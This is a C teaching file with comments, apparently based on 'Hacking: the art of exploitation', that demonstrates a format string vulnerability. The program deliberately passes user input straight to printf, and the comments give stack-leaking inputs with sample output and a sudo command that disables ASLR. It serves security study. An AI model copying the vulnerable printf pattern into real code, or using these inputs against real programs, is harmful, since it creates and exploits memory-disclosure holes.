/*
From "Hacking: the art of exploitation"

This program takes 

printf(string);         <- vulnerable, NEVER use printf like this
printf("%s", string);   <- safe
both can print out string, but the first method can be exploited.

NOTE: 
    since Linux uses ASLR by default, the following exploit may not be successful. (because the address of variables will be random at each execution)
    for experiment purpose, to disable ASLR, type "sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'" 

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]) {
    char text[1024];
    static int test_val = -72;

    char target[100] = "try to print this!";
    printf("    [DEBUG] target is at: %08x\n", target);

    if(argc < 2) {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }
    int i = 0;
    for(i = 0; i < argc; i++) {
        printf("    [DEBUG] %s\n", argv[i]);
    }

    strcpy(text, argv[1]);

    printf("The right way to print user-controlled input (printf(\"%%s\", string)):\n");
    printf("%s", text);

    printf("\nThe wrong way to print user-controlled input (printf(string)):\n");
    printf(text);

    printf("\n");

    // Debug output
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    
    exit(0);
}

/*
Now try to exploit the 1st method.
Note: the test result in different PCs may vary.

1. ./a.out testing
    the 2 methods output testing, no problem here

2. ./a.out testing%x
    printf(string);         <- testing61fb30
    printf("%s", string);   <- testing%x
    Explain: when %x is used, a 4-byte word (following string in stack) will be printed, use this to exam stack frame

3. ./a.out $(perl -e 'print "%08x."x40')
    printf(string);         <- 01c05010.162ef780.160202c0.164d1700.000000c8.07540108.00f7803b.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.162fd600.00000846.15f39ff8.164d2000.0753fd98.0753fd94.162fcfe1.f8e00000.
    printf("%s", string);   <- %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
    Explain: to print data in lower stack. the repeating "25 30 38 78 2e" are "%08x." (try type in "printf "\x25\x30\x38\x78\x2e"" to see the result)

4. ./a.out AAAA%08x.%08x.%08x.%08x
    printf(string);         <- AAAA0061fb30.00000000.00000000.41414141
    printf("%s", string);   <- AAAA%08x.%08x.%08x.%08x
    Explain: the 0x41414141 is AAAA, if the 4th %08x replaced with %s, 
        the program will try to print the string at 0x41414141 memory address
        this will end in a segmentation fault crash.

5. ToDo:
*/
